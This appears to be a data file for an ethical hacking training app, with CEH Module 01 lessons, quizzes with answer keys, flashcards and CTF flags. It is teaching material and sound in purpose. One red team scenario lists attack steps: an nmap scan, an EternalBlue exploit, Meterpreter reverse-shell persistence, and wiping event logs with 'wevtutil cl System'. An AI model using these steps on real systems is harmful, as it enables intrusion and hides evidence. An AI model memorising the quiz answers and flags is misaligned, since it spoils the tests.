      {q:'What is "vulnerability research" in the context of ethical hacking?',opts:['Writing malware','Finding and analyzing security flaws in systems','Social engineering employees','Installing backdoors'],correct:1,fb:'Vulnerability research involves identifying, analyzing, and documenting security weaknesses — the core skill of an ethical hacker.'},
      {q:'Which law primarily governs unauthorized computer access in the USA?',opts:['GDPR','HIPAA','Computer Fraud and Abuse Act (CFAA)','PCI-DSS'],correct:2,fb:'The Computer Fraud and Abuse Act (CFAA) is the primary US federal law governing unauthorized computer access and cybercrime.'},
      {q:'A pen tester at GlobalFinCorp tests a server not listed in the scope document. This is:',opts:['Acceptable if vulnerabilities are found','Legal since they are hired','Illegal and potentially criminal','Standard practice'],correct:2,fb:'Testing systems outside the defined scope is unauthorized access — a criminal offense under the CFAA regardless of employment status.'},
      {q:'A client requests a "black box" test. What information does the tester receive?',opts:['Full network diagrams and credentials','Source code access','Only the company name and target IP range','Admin credentials'],correct:2,fb:'Black box testing simulates an external attacker with no insider knowledge — testers receive minimal or no information about the target.'},
      {q:'What should a pen tester do upon discovering a critical vulnerability mid-engagement?',opts:['Exploit it further to demonstrate impact','Ignore it until the final report','Immediately notify the client per the escalation plan','Post it to social media'],correct:2,fb:'Critical vulnerabilities (especially those affecting business continuity) must be immediately escalated to the client per the agreed escalation procedure.'},
      {q:'Which ethical hacking type tests employees\' susceptibility to manipulation?',opts:['Network pen test','Web app test','Social engineering assessment','Code review'],correct:2,fb:'Social engineering assessments test human vulnerability — phishing simulations, vishing calls, and physical impersonation tests.'},
    ],
    flashcards:[
      {f:'Rules of Engagement',b:'Document defining scope, methods, timeline, and legal authorization for a pen test.'},
      {f:'Black Box Test',b:'Penetration test where the tester has zero prior knowledge of the target system.'},
      {f:'White Box Test',b:'Penetration test with full access to source code, architecture, and credentials.'},
      {f:'Grey Box Test',b:'Penetration test with partial knowledge — simulates a compromised insider or privileged user.'},
      {f:'CFAA',b:'Computer Fraud and Abuse Act — primary US federal law governing unauthorized computer access.'},
      {f:'CVE',b:'Common Vulnerabilities and Exposures — standardized naming system for publicly known security flaws.'},
    ],
    summary:[
      'All ethical hacking requires written authorization — verbal approval is legally insufficient.',
      'The scope defines the legal boundary — testing outside scope is a crime.',
      'CEH methodology: Reconnaissance → Scanning → Gaining Access → Maintaining Access → Covering Tracks.',
      'Critical vulnerabilities must be escalated immediately to the client, not saved for the final report.',
      'Understanding relevant laws (CFAA, GDPR, HIPAA) is mandatory for every ethical hacker.',
    ],
    diagram:{
      title:'Ethical Hacking Engagement Lifecycle',
      steps:[
        {icon:'📝',label:'Pre-Engagement',desc:'Define scope, sign NDA and SOW, establish Rules of Engagement. Get written authorization — without this you are a criminal.'},
        {icon:'🔍',label:'Reconnaissance',desc:'Gather intelligence: OSINT, WHOIS, DNS enumeration, employee profiling, IP range mapping.'},
        {icon:'📡',label:'Scanning & Enumeration',desc:'Actively probe target: port scanning (Nmap), service versioning, OS fingerprinting, vulnerability scanning.'},
        {icon:'💥',label:'Exploitation',desc:'Attempt to exploit discovered vulnerabilities within the agreed scope to gain unauthorized access.'},
        {icon:'📊',label:'Post-Exploitation & Reporting',desc:'Document findings: proof-of-concept, CVSS scores, business impact assessment, remediation steps.'},
        {icon:'🤝',label:'Remediation & Retest',desc:'Client fixes vulnerabilities. You verify fixes were correctly implemented. Cycle repeats until clean.'}
      ]
    },
    enterprise:{
      role:'You are the Lead Penetration Tester contracted by GlobalFinSec Corp.',
      situation:'The CISO verbally tells you to "test everything" before a PCI-DSS audit next month. No paperwork has been signed.',
      challenge:'Identify every legal and ethical action you must take BEFORE beginning any testing activity.',
      steps:[
        'Decline to start testing. Verbal authorization is legally insufficient under CFAA (USA) and Computer Misuse Act (UK).',
        'Draft a Statement of Work (SOW): scope (IP ranges, domains, apps), excluded systems, testing windows, emergency contacts.',
        'Draft a Rules of Engagement (RoE): allowed techniques, prohibited actions (no production DoS), escalation procedures.',
        'Get both documents signed by an authorized executive (CISO, CTO, or CEO).',
        'Only then begin passive OSINT reconnaissance — no active probing until paperwork is signed.'
      ],
      outcome:'Proper documentation protects both tester (legal immunity) and client (defined liability). Testing began 3 days later after paperwork was signed. 47 vulnerabilities found, including 3 critical RCEs.',
      lesson:'The most important tool in an ethical hacker\'s kit is not Nmap or Metasploit. It is the signed authorization document.'
    },
    pitfalls:[
      {icon:'⚠️',title:'Testing Without Written Authorization',desc:'A verbal "go ahead" from the IT manager is not legal authorization. If anything goes wrong, you face criminal prosecution.',fix:'Always obtain a signed Statement of Work AND Rules of Engagement before generating a single packet.'},
      {icon:'🔴',title:'Testing Systems Outside Defined Scope',desc:'Following an attack chain to an out-of-scope system is unauthorized access — a criminal offense regardless of employment status.',fix:'Define scope boundaries explicitly in the RoE. If you discover a path to out-of-scope systems, stop and notify the client immediately.'},
      {icon:'⛔',title:'Saving Critical Findings for the Final Report',desc:'Discovering a critical RCE on Day 1 and waiting 3 weeks to report it leaves the client exposed throughout the engagement.',fix:'Establish an escalation procedure for critical findings. Call the emergency contact the moment a critical vulnerability is confirmed.'},
      {icon:'🎭',title:'Confusing a Vuln Scan with a Penetration Test',desc:'Running Nessus and handing over a scan report is not a penetration test. It is a vulnerability scan.',fix:'A real penetration test involves manual exploitation, chained attack paths, business impact assessment, and proof-of-concept evidence.'}
    ],
    lab:{title:'Lab: Draft a Rules of Engagement Document',steps:['Create a new document titled "Rules of Engagement — Penetration Test"','Include sections: Executive Summary, Scope (in-scope and out-of-scope systems), Testing Methods Allowed, Testing Schedule, Emergency Contacts, Escalation Procedure, Legal Authorization Statement.','Define a mock scope: "Testing authorized on 192.168.1.0/24 network only, excluding production database server 192.168.1.50."','Add a signature block for both client and tester.','Review against PTES (Penetration Testing Execution Standard) guidelines at pentest-standard.org.']}
  },
  'hacking-methodologies': {
    module: 'Module 01 · Introduction to Ethical Hacking',
    title: 'Hacking Methodologies & Frameworks',
    sub: 'Structured Approaches to Cyber Attacks and Defense',
    killchain: { phase: 'All Phases', mitre: 'TA0001-TA0011', desc: 'Understanding the structured methodologies attackers use helps defenders anticipate and disrupt the attack lifecycle.' },
    diagram:{
      title:'CEH 5-Phase Attack Methodology',
      steps:[
        {icon:'🔍',label:'Phase 1 — Reconnaissance',desc:'Passive and active information gathering: OSINT, WHOIS, DNS, social media, Shodan, Google Dorking. No direct contact with target.'},
        {icon:'📡',label:'Phase 2 — Scanning',desc:'Active probing: port scanning (Nmap), vulnerability scanning (Nessus), OS fingerprinting, service version detection, network mapping.'},
        {icon:'🔓',label:'Phase 3 — Gaining Access',desc:'Exploiting discovered vulnerabilities: password cracking, buffer overflows, social engineering, web app attacks, privilege escalation.'},
        {icon:'🔏',label:'Phase 4 — Maintaining Access',desc:'Establishing persistence: backdoors, rootkits, scheduled tasks, remote access trojans (RATs). Evading AV/EDR detection.'},
        {icon:'🧹',label:'Phase 5 — Covering Tracks',desc:'Erasing evidence: deleting logs, clearing bash_history, timestomping, using covert channels, removing malware artifacts.'}
      ]
    },
    enterprise:{
      role:'You are the Red Team Lead at GlobalFinSec Corp simulating an APT attack.',
      situation:'The CISO has approved a 2-week purple team exercise to test detection capabilities across all 5 phases of the CEH methodology. The Blue Team knows an exercise is happening, but not when or how.',
      challenge:'Execute a realistic kill chain against the test environment (192.168.50.0/24) mapping every action to a CEH phase and a MITRE ATT&CK technique.',
      steps:[
        'Phase 1 — Recon: Run theHarvester and Maltego to map employee names, emails, and LinkedIn profiles. Passive only.',
        'Phase 2 — Scan: Run nmap -sS -sV -O -A 192.168.50.0/24 to map open ports and service versions.',
        'Phase 3 — Gain Access: Use Metasploit to exploit an unpatched EternalBlue (MS17-010) on a test Windows host.',
        'Phase 4 — Maintain Access: Deploy a Meterpreter reverse shell and set up a scheduled task for persistence.',
        'Phase 5 — Cover Tracks: Clear the Windows Event Log (wevtutil cl System), delete prefetch files, timestomp artifacts.'
      ],
      outcome:'The exercise revealed the Blue Team detected Phases 2 and 3 (Nmap scan and exploit) but completely missed Phases 1, 4, and 5. Post-exercise, SIEM rules were added for PowerShell execution and scheduled task creation.',
      lesson:'Defenders must monitor all 5 phases, not just the exploit. Recon and post-exploitation are the most commonly undetected phases in real-world attacks.'
    },
    pitfalls:[
      {icon:'⚠️',title:'Skipping the Methodology and Going Straight to Exploitation',desc:'New penetration testers often skip recon and scanning, jumping directly to running Metasploit. This leads to noisy, incomplete, and incomplete assessments.',fix:'Always follow the methodology in order. Thorough recon reveals attack surface that scanning alone misses.'},
      {icon:'🔴',title:'Confusing MITRE ATT&CK with the CEH Kill Chain',desc:'MITRE ATT&CK has 14 Tactics, CEH has 5 phases. Students mix them up in exams and real assessments.',fix:'CEH 5 phases = strategic overview. MITRE ATT&CK = granular technique library. Use both together: CEH phase identifies "where you are," ATT&CK identifies "how you do it."'},
      {icon:'⛔',title:'Not Clearing Tracks During a Real Engagement',desc:'Leaving Nmap logs, Metasploit sessions, and dropped files on a client system is unprofessional and creates security risks.',fix:'Always clean up artifacts at the end of an engagement. Document what was placed on systems and have a cleanup checklist in your methodology.'},
      {icon:'🎭',title:'Treating the Cyber Kill Chain and CEH Methodology as Identical',desc:'The Lockheed Martin Cyber Kill Chain is 7 steps focused on the attacker; CEH methodology is 5 phases focused on the pen tester. They overlap but differ.',fix:'Know both: CEH methodology for exam and engagement planning; Cyber Kill Chain for understanding and disrupting real attacker behavior.'}
    ],
        learn: { simple: 'A hacking methodology is a step-by-step blueprint for conducting a penetration test or cyber attack, ensuring thoroughness and repeatability.', analogy: 'Like a bank robber casing the joint, planning the route, disabling the alarms, stealing the cash, and erasing the security footage.', why: 'Without a methodology, assessments are chaotic and likely to miss critical vulnerabilities. Frameworks provide a common language for the industry.', architecture: 'Key frameworks include the CEH Methodology (Reconnaissance, Scanning, Gaining Access, Maintaining Access, Clearing Tracks), Lockheed Martin Cyber Kill Chain, MITRE ATT&CK, and PTES (Penetration Testing Execution Standard).' },
    tools: [ { name: 'MITRE ATT&CK Navigator', cmd: 'Online Tool', desc: 'Used to explore and map adversary tactics and techniques.' }, { name: 'OSSTMM', cmd: 'Document', desc: 'Open Source Security Testing Methodology Manual.' } ],
    commands: { win: ['systeminfo', 'netstat -ano'], lin: ['uname -a', 'ps aux'] },
    ctf: { scenario: 'You are analyzing an attacker\'s path through a network. They first gathered OSINT, then ran an Nmap scan, exploited an SMB vulnerability, installed a rootkit, and deleted the bash_history. What is the CEH methodology sequence?', hint: 'Think of the 5 phases of hacking according to EC-Council.', flag: 'CEH{r3c0n_sc4n_g41n_m41nt41n}', points: 100 },
    quiz: [
      { q: 'Which phase of the CEH hacking methodology involves extracting information such as user names, machine names, and network resources?', opts: ['Reconnaissance', 'Scanning and Enumeration', 'Gaining Access', 'Maintaining Access'], correct: 1, fb: 'Scanning and enumeration involves active connection and extraction of specific information.' },
      { q: 'In the Cyber Kill Chain, which step immediately follows Reconnaissance?', opts: ['Delivery', 'Exploitation', 'Weaponization', 'Installation'], correct: 2, fb: 'Weaponization is the preparation of the payload following initial reconnaissance.' },
      { q: 'Which framework focuses heavily on mapping specific adversary behaviors and techniques based on real-world observations?', opts: ['PTES', 'NIST CSF', 'Cyber Kill Chain', 'MITRE ATT&CK'], correct: 3, fb: 'MITRE ATT&CK is a globally accessible knowledge base of adversary tactics and techniques.' },
      { q: 'What is the primary purpose of the "Clearing Tracks" phase?', opts: ['To find more vulnerabilities', 'To maintain long-term access', 'To evade detection and avoid legal consequences', 'To escalate privileges'], correct: 2, fb: 'Clearing tracks (or covering tracks) is done to remove evidence of the intrusion.' },
      { q: 'Which penetration testing standard includes phases such as Threat Modeling, Vulnerability Analysis, and Post-Exploitation?', opts: ['OSSTMM', 'PTES', 'ISO 27001', 'ITIL'], correct: 1, fb: 'The Penetration Testing Execution Standard (PTES) defines these specific phases.' },
      { q: 'What type of reconnaissance involves gathering information without directly interacting with the target system?', opts: ['Active Reconnaissance', 'Passive Reconnaissance', 'Aggressive Scanning', 'Banner Grabbing'], correct: 1, fb: 'Passive reconnaissance relies on publicly available information (OSINT) to avoid detection.' },
      { q: 'In the context of MITRE ATT&CK, what does "TA" stand for?', opts: ['Tactical Assessment', 'Target Acquisition', 'Threat Actor', 'Tactic'], correct: 3, fb: 'TA stands for Tactic, representing the "why" of an ATT&CK technique.' },
      { q: 'Which step of the Cyber Kill Chain involves transmitting the weapon to the targeted environment?', opts: ['Weaponization', 'Delivery', 'Exploitation', 'Action on Objectives'], correct: 1, fb: 'Delivery is the transmission of the payload to the target (e.g., via email attachment or USB).' },
      { q: 'What is the main difference between vulnerability scanning and penetration testing?', opts: ['Vulnerability scanning is manual, pentesting is automated', 'Pentesting actively exploits vulnerabilities, scanning only identifies them', 'Scanning is done by blue teams, pentesting by red teams', 'There is no difference'], correct: 1, fb: 'Penetration testing goes a step further by attempting to exploit the discovered vulnerabilities to determine actual risk.' },
      { q: 'Which EC-Council methodology phase involves installing backdoors or rootkits?', opts: ['Gaining Access', 'Clearing Tracks', 'Scanning', 'Maintaining Access'], correct: 3, fb: 'Maintaining Access involves deploying mechanisms like backdoors to ensure persistent access.' }
    ],
    flashcards: [ { f: 'Five phases of CEH methodology', b: 'Reconnaissance, Scanning, Gaining Access, Maintaining Access, Clearing Tracks' }, { f: 'Cyber Kill Chain: Delivery', b: 'Transmitting the weapon to the targeted environment.' } ],
    summary: [ 'Hacking methodologies provide structured approaches for both attackers and defenders.', 'The CEH methodology consists of 5 phases: Recon, Scanning, Gaining Access, Maintaining Access, Clearing Tracks.', 'MITRE ATT&CK maps real-world adversary tactics and techniques.' ],
    lab: { title: 'Mapping Attacks to Frameworks', steps: [ 'Analyze a given packet capture of an attack.', 'Map the attacker\'s actions to the phases of the Cyber Kill Chain.', 'Identify the corresponding MITRE ATT&CK techniques used.' ] }
  },
  'security-controls': {
    module: 'Module 01 · Introduction to Ethical Hacking',
    title: 'Information Security Controls',
    sub: 'Implementing Defense in Depth',
    killchain: { phase: 'All Phases', mitre: 'Defensive Mitigations', desc: 'Security controls are the countermeasures put in place to mitigate risks and disrupt the kill chain.' },
    diagram:{
      title:'Defense in Depth — Layered Security Control Model',
      steps:[
        {icon:'📜',label:'Administrative Controls (Policies)',desc:'Policies, procedures, security awareness training, background checks, NDAs, acceptable use policies. The human and process layer.'},
        {icon:'🚪',label:'Physical Controls (Barriers)',desc:'Fences, locks, biometric access, security guards, CCTV, mantrap entry systems. Prevent unauthorized physical access.'},
        {icon:'💻',label:'Technical Controls — Perimeter',desc:'Firewalls, IDS/IPS, DMZ, VPN gateways, network segmentation. The first technical line of defense.'},
        {icon:'🔒',label:'Technical Controls — Endpoint',desc:'Antivirus, EDR, host-based firewalls, disk encryption (BitLocker/FileVault), patch management, application whitelisting.'},
        {icon:'📊',label:'Detective Controls — Monitoring',desc:'SIEM, log management, DLP, UEBA, network traffic analysis. Detect anomalies during or after an incident.'},
        {icon:'🔧',label:'Corrective & Recovery Controls',desc:'Incident response playbooks, backup and restore, disaster recovery plans, business continuity. Minimize damage and restore operations.'}
      ]
    },
    enterprise:{
      role:'You are the Information Security Manager at GlobalFinSec Corp.',
      situation:'A ransomware attack encrypted 200 workstations across two branch offices. Post-incident review revealed: no endpoint EDR, backups existed but had never been tested, and there was no formal incident response plan.',
      challenge:'Design a layered Defense in Depth architecture that would have prevented or contained this ransomware attack.',
      steps:[
        'Administrative: Mandate quarterly phishing simulation training (ransomware enters via phishing in 91% of cases).',
        'Technical - Perimeter: Deploy email filtering (ATP) with attachment sandboxing to block malicious Office macros.',
        'Technical - Endpoint: Deploy EDR (CrowdStrike/Defender for Endpoint) with behavioral ransomware detection.',
        'Detective: Configure SIEM alerts for mass file encryption events (high write IOPS + file extension changes).',
        'Recovery: Implement 3-2-1 backup rule: 3 copies, 2 different media, 1 offsite. Test restoration monthly.'
      ],
      outcome:'Post-implementation, a second ransomware attempt 6 months later was detected at the email gateway (ATP blocked the macro), and EDR quarantined the sample on the one endpoint that clicked through within 8 seconds.',
      lesson:'Defense in Depth means no single control failure causes a breach. Every layer buys time for detection and response.'
    },
    pitfalls:[
      {icon:'⚠️',title:'Relying on a Single Control Type',desc:'Organizations often deploy only technical controls (firewall, antivirus) while ignoring administrative controls (training, policies). When the firewall is bypassed, nothing stops the attacker.',fix:'Implement all three control types: Administrative, Technical, and Physical. A policy without a technical enforcement mechanism is just a wish.'},
      {icon:'🔴',title:'Confusing Control Type with Control Function',desc:'Students mix up "what kind" (Admin/Technical/Physical) with "what it does" (Preventive/Detective/Corrective). A firewall is Technical + Preventive. An audit log is Technical + Detective.',fix:'Always classify controls on both axes: Type (Admin/Technical/Physical) AND Function (Preventive/Detective/Corrective/Deterrent/Recovery/Compensating).'},
      {icon:'⛔',title:'Deploying Compensating Controls Permanently',desc:'Compensating controls are meant to be temporary substitutes when primary controls cannot be implemented. Organizations often leave them in place indefinitely.',fix:'Document compensating controls with a sunset date and remediation plan. Review quarterly. Replace with primary controls as soon as feasible.'},
      {icon:'🎭',title:'Never Testing Recovery Controls',desc:'Organizations have backups but never test restoration. Backups that fail during a ransomware recovery are a critical control failure.',fix:'Test backup restoration on a quarterly schedule. Simulate complete system recovery in a staging environment. Backup integrity without restoration testing is false assurance.'}
    ],
        learn: { simple: 'Security controls are safeguards or countermeasures to avoid, detect, counteract, or minimize security risks to physical property, information, computer systems, or other assets.', analogy: 'Like a castle\'s defenses: the moat (physical), the guards checking IDs (administrative), and the heavy iron gates with complex locks (technical).', why: 'No single security measure is foolproof. Layering different types of controls ensures that if one fails, others are there to protect the assets.', architecture: 'Controls are categorized by type (Administrative, Technical/Logical, Physical) and function (Preventive, Detective, Corrective, Deterrent, Recovery, Compensating). Defense in Depth is the strategy of applying multiple layers of controls.' },
    tools: [ { name: 'Firewall', cmd: 'iptables -L', desc: 'A technical preventive control.' }, { name: 'IDS/IPS', cmd: 'snort -c /etc/snort/snort.conf', desc: 'Technical detective and preventive controls.' } ],
    commands: { win: ['secpol.msc', 'gpedit.msc'], lin: ['chmod', 'chown', 'auditd'] },
    ctf: { scenario: 'You need to classify a new policy that requires all employees to attend annual security awareness training. What type of control is this?', hint: 'It\'s not software, and it\'s not a locked door. It\'s a rule for people.', flag: 'CEH{d3f3ns3_1n_d3pth_p0l1cy}', points: 100 },
    quiz: [
      { q: 'Which of the following is an example of a Physical security control?', opts: ['Biometric scanner', 'Firewall rules', 'Acceptable Use Policy', 'Antivirus software'], correct: 0, fb: 'Physical controls restrict physical access to facilities or hardware.' },
      { q: 'Security awareness training is classified as what type of control?', opts: ['Technical', 'Physical', 'Administrative', 'Logical'], correct: 2, fb: 'Administrative controls involve policies, procedures, and training for personnel.' },
      { q: 'What is the primary goal of a "Detective" control?', opts: ['To prevent an incident from occurring', 'To identify and record an incident while it is occurring', 'To restore systems after an incident', 'To discourage an attacker'], correct: 1, fb: 'Detective controls are designed to identify and alert on unauthorized activity.' },
      { q: 'Which concept describes the practice of implementing multiple, overlapping security controls to protect an asset?', opts: ['Least Privilege', 'Separation of Duties', 'Defense in Depth', 'Security through Obscurity'], correct: 2, fb: 'Defense in depth uses multiple layers of security to ensure redundancy.' },
      { q: 'A backup and restore system is an example of which functional control type?', opts: ['Preventive', 'Deterrent', 'Recovery', 'Detective'], correct: 2, fb: 'Recovery controls are used to restore systems and data to normal operations after an incident.' },
      { q: 'Which of the following is a Technical (Logical) control?', opts: ['Security guard', 'Access Control Lists (ACLs)', 'Background checks', 'Fences'], correct: 1, fb: 'Technical controls use technology, such as ACLs, firewalls, and encryption.' },
      { q: 'A "Warning: Guard Dogs on Duty" sign is best described as what type of control?', opts: ['Preventive', 'Detective', 'Deterrent', 'Compensating'], correct: 2, fb: 'Deterrent controls aim to discourage individuals from attempting an attack.' },
      { q: 'If a primary control cannot be implemented due to business constraints, what type of control is used instead?', opts: ['Compensating', 'Corrective', 'Administrative', 'Deterrent'], correct: 0, fb: 'Compensating controls are alternative measures used when primary controls are not feasible.' },
      { q: 'Which control function is designed to fix a system and mitigate the impact after a security incident?', opts: ['Preventive', 'Detective', 'Corrective', 'Deterrent'], correct: 2, fb: 'Corrective controls actively fix or mitigate the damage caused by an incident (e.g., terminating a malicious process).' },
      { q: 'Data encryption at rest is an example of a:', opts: ['Physical Preventive control', 'Technical Preventive control', 'Administrative Detective control', 'Technical Detective control'], correct: 1, fb: 'Encryption uses technology (Technical) to stop unauthorized access to data (Preventive).' }
    ],
    flashcards: [ { f: 'Administrative Controls', b: 'Policies, procedures, training, and regulations.' }, { f: 'Defense in Depth', b: 'Layering multiple security controls to provide redundant protection.' } ],
    summary: [ 'Security controls mitigate risks and are categorized into Administrative, Technical, and Physical types.', 'Controls also have functions: Preventive, Detective, Corrective, Deterrent, Recovery, and Compensating.', 'Defense in Depth is a critical strategy to avoid single points of failure.' ],
    lab: { title: 'Implementing Layered Controls', steps: [ 'Configure a technical control: set up iptables firewall rules.', 'Configure a detective control: review auditd logs for unauthorized access attempts.', 'Draft a brief administrative acceptable use policy.' ] }
  },
  'security-laws': {
    module: 'Module 01 · Introduction to Ethical Hacking',
    title: 'Information Security Laws & Standards',
    sub: 'Compliance, Regulations, and Legal Frameworks',
    killchain: { phase: 'N/A', mitre: 'N/A', desc: 'Understanding laws and standards ensures that ethical hacking is performed legally and that organizations meet their compliance obligations.' },
    diagram:{
      title:'Regulatory Compliance Framework Hierarchy',
      steps:[
        {icon:'🇪🇺',label:'GDPR (EU) — Privacy Law',desc:'General Data Protection Regulation. Applies to any org processing EU citizen data. Max fine: 4% of global annual revenue or €20M. Right to be forgotten, data portability, 72-hour breach notification.'},
        {icon:'🏥',label:'HIPAA (USA) — Healthcare Data',desc:'Health Insurance Portability and Accountability Act. Protects electronic Protected Health Information (ePHI). Applies to covered entities and business associates. Fines up to $1.9M/year.'},
        {icon:'💳',label:'PCI-DSS — Payment Card Data',desc:'Payment Card Industry Data Security Standard. Mandatory for any entity storing, processing, or transmitting cardholder data. 12 core requirements including encryption, access control, and quarterly scans.'},
        {icon:'💼',label:'SOX (USA) — Corporate Finance',desc:'Sarbanes-Oxley Act. Requires accurate financial reporting controls for publicly traded US companies. IT controls for financial systems are audited annually.'},
        {icon:'📋',label:'ISO/IEC 27001 — ISMS Standard',desc:'International standard for Information Security Management Systems. Certification demonstrates systematic approach to managing sensitive information. Risk-based framework with 93 controls in Annex A.'},
        {icon:'🖥️',label:'NIST CSF — Cybersecurity Framework',desc:'US NIST Cybersecurity Framework: Identify, Protect, Detect, Respond, Recover. Voluntary guidance for critical infrastructure. Widely adopted as a baseline globally.'}
      ]
    },
    enterprise:{
      role:'You are the Chief Information Security Officer (CISO) at GlobalFinSec Corp.',
      situation:'GlobalFinSec processes credit card payments for 2 million EU customers and stores electronic health insurance records for their employee benefits program. A breach has just been discovered — 500,000 customer records were accessed by an unauthorized party.',
      challenge:'Identify which regulatory frameworks are triggered, what the notification deadlines are, and what the maximum financial exposure is.',
      steps:[
        'Identify frameworks: GDPR (EU customer data) + HIPAA (employee health insurance ePHI) + PCI-DSS (credit card data) are all triggered.',
        'GDPR: 72-hour breach notification to the supervisory authority (Article 33). Notify affected individuals "without undue delay."',
        'HIPAA: 60-day notification to HHS Office for Civil Rights + affected individuals. If >500 individuals, notify prominent media.',
        'PCI-DSS: Immediately notify your acquiring bank and card brands (Visa/Mastercard). Engage a PCI Forensic Investigator (PFI).',
        'Calculate exposure: GDPR max = 4% of global revenue. PCI-DSS = $5,000-$100,000/month fines + potential card brand termination.'
      ],
      outcome:'GlobalFinSec notified authorities within 68 hours (GDPR compliant), engaged a PFI for PCI-DSS forensics, and avoided the maximum fines by demonstrating existing controls and rapid response. Total regulatory fines: €2.1M (reduced from potential €15M).',
      lesson:'Multi-framework compliance is not a checklist exercise — it requires a unified data classification policy that maps every data type to its regulatory requirements before a breach occurs.'
    },
    pitfalls:[
      {icon:'⚠️',title:'Treating GDPR as Europe-Only',desc:'Organizations outside the EU assume GDPR does not apply to them. If you process data of EU residents — regardless of where you are located — GDPR applies to you.',fix:'Audit your entire data pipeline. If any EU resident data is processed, stored, or transmitted by your systems, GDPR compliance is mandatory.'},
      {icon:'🔴',title:'Confusing ISO 27001 Certification with PCI-DSS Compliance',desc:'ISO 27001 is a framework for information security management. PCI-DSS is a specific standard for cardholder data. They are complementary but neither substitutes for the other.',fix:'Map your compliance requirements by data type. Credit card data = PCI-DSS. Personal data of EU citizens = GDPR. Patient health data = HIPAA. Each may require separate controls.'},
      {icon:'⛔',title:'Missing Breach Notification Deadlines',desc:'GDPR requires 72-hour notification. HIPAA requires 60 days. Many organizations lack incident response plans that include regulatory notification procedures, missing these deadlines and incurring additional fines.',fix:'Build regulatory notification timelines into your Incident Response Plan. Create notification templates in advance. Designate a DPO (Data Protection Officer) for GDPR compliance.'},
      {icon:'🎭',title:'Achieving Compliance Once, Then Neglecting It',desc:'Compliance is treated as a one-time project. Frameworks like PCI-DSS require quarterly vulnerability scans and annual penetration tests. Letting these lapse creates non-compliance.',fix:'Build compliance into operational BAU (business as usual). Use GRC tools (Archer, ServiceNow) to automate compliance tracking and schedule recurring control assessments.'}
    ],
        learn: { simple: 'Information security laws are government-enforced rules regarding data protection, while standards are industry-accepted best practices and frameworks for managing security.', analogy: 'Laws are the speed limits set by the government (you get a ticket if you break them); standards are the safety ratings of your car (best practices to keep you safe).', why: 'Ethical hackers must stay within legal boundaries to avoid prosecution. Furthermore, organizations hire hackers primarily to ensure they comply with these laws and standards to avoid hefty fines.', architecture: 'Key regulations include GDPR (EU privacy), HIPAA (US Healthcare), SOX (US Corporate Financials), and PCI-DSS (Credit Card data). Key standards include ISO/IEC 27001 (ISMS) and the NIST Cybersecurity Framework.' },
    tools: [ { name: 'Compliance Scanners', cmd: 'OpenSCAP', desc: 'Tools that audit systems against standard baselines.' } ],
    commands: { win: ['Get-LocalGroupMember'], lin: ['lynis audit system'] },
    ctf: { scenario: 'A global e-commerce company suffered a breach of European customer data and credit card information. They are facing fines from two major regulatory frameworks. What are they?', hint: 'One is an EU privacy law, the other is a payment card industry standard.', flag: 'CEH{c0mpl14nc3_1s_k3y_2026}', points: 100 },
    quiz: [
      { q: 'Which regulation applies to the protection of healthcare and patient data in the United States?', opts: ['HIPAA', 'GDPR', 'PCI-DSS', 'SOX'], correct: 0, fb: 'The Health Insurance Portability and Accountability Act (HIPAA) secures electronic protected health information (ePHI).' },
      { q: 'If an organization processes credit card transactions, which standard MUST they comply with?', opts: ['ISO 27001', 'PCI-DSS', 'FISMA', 'GLBA'], correct: 1, fb: 'The Payment Card Industry Data Security Standard (PCI-DSS) is mandatory for organizations handling credit card data.' },
      { q: 'Which European Union regulation imposes strict rules on data privacy and gives individuals the "right to be forgotten"?', opts: ['DMCA', 'CFAA', 'GDPR', 'HIPAA'], correct: 2, fb: 'The General Data Protection Regulation (GDPR) enforces strong data privacy rules for EU citizens.' },
      { q: 'Which US law was enacted to protect investors by improving the accuracy and reliability of corporate disclosures and financial reporting?', opts: ['SOX', 'HIPAA', 'GLBA', 'FISMA'], correct: 0, fb: 'The Sarbanes-Oxley Act (SOX) dictates requirements for storing and retaining corporate financial records.' },
      { q: 'ISO/IEC 27001 primarily specifies the requirements for establishing, implementing, maintaining, and continually improving a(n):', opts: ['Firewall architecture', 'Information Security Management System (ISMS)', 'Intrusion Detection System', 'Software Development Life Cycle'], correct: 1, fb: 'ISO 27001 is the international standard for ISMS.' },
      { q: 'Which framework organizes cybersecurity activities into five core functions: Identify, Protect, Detect, Respond, and Recover?', opts: ['NIST CSF', 'ISO 27001', 'PCI-DSS', 'COBIT'], correct: 0, fb: 'The NIST Cybersecurity Framework (CSF) is structured around these five core functions.' },
      { q: 'The Gramm-Leach-Bliley Act (GLBA) requires specific data protection implementations for which type of institutions?', opts: ['Hospitals', 'Financial Institutions', 'E-commerce retailers', 'Government agencies'], correct: 1, fb: 'GLBA requires financial institutions to explain their information-sharing practices and safeguard sensitive data.' },
      { q: 'What is the primary purpose of the Computer Fraud and Abuse Act (CFAA) in the United States?', opts: ['To regulate credit card processing', 'To criminalize unauthorized access to computer systems', 'To enforce healthcare data privacy', 'To mandate corporate financial auditing'], correct: 1, fb: 'The CFAA is the primary federal anti-hacking law in the US.' },
      { q: 'Which standard provides a comprehensive set of controls comprising best practices in information security (often used alongside ISO 27001)?', opts: ['ISO 27002', 'PCI-DSS', 'HIPAA', 'SOX'], correct: 0, fb: 'ISO/IEC 27002 provides a reference set of generic information security controls.' },
      { q: 'Under GDPR, organizations must report certain types of data breaches to the relevant supervisory authority within how many hours of becoming aware of it?', opts: ['24 hours', '48 hours', '72 hours', '1 week'], correct: 2, fb: 'GDPR mandates a 72-hour notification window for personal data breaches.' }
    ],
    flashcards: [ { f: 'HIPAA', b: 'US law protecting healthcare and patient data (ePHI).' }, { f: 'GDPR', b: 'EU regulation for data privacy and personal data protection.' } ],
    summary: [ 'Compliance with laws and standards is non-negotiable and dictates how security is implemented.', 'Key regulations include GDPR (EU Data), HIPAA (US Healthcare), SOX (US Financials), and PCI-DSS (Credit Cards).', 'Frameworks like ISO 27001 and NIST CSF help organizations build structured security programs.' ],
    lab: { title: 'Compliance Auditing', steps: [ 'Run OpenSCAP on a Linux system against a specific compliance profile (e.g., PCI-DSS).', 'Review the generated HTML report.', 'Identify and remediate three non-compliant settings.' ] }
  }
,
};

// Stubs for remaining topics
const TOPIC_STUBS = {
  'footprinting-concepts':{module:'Module 02',title:'Footprinting Concepts',sub:'Active vs passive footprinting, information gathering objectives and methodology.'},
  'osint-techniques':{module:'Module 02',title:'OSINT Techniques',sub:'Open-source intelligence gathering: Shodan, Maltego, theHarvester, and more.'},
  'whois-dns':{module:'Module 02',title:'Whois & DNS Footprinting',sub:'Domain registration data, DNS record enumeration, zone transfer attacks.'},
